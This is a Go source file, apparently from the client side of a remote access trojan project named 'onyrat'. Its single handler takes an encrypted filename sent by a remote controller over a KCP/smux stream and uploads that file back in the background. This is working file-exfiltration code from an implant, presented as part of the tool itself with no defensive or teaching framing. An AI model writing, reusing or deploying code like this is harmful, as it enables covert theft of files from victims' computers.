//go:build client
// +build client

package handlers

import (
	"context"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/commands/transfer"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/xtaci/smux"
)

func HandleDownload(c *network.KCPClient, stream *smux.Stream, ctx context.Context) error {
	buf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(buf)

	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to get the filename: %w", err)
	}

	filename := string(buf[:n])

	go func() {
		if err := transfer.Upload(c, c.Manager, filename, ctx); err != nil {
			logger.Log.Errorf("failed to upload file: %s: %v", filename, err)
		}
	}()

	return nil
}
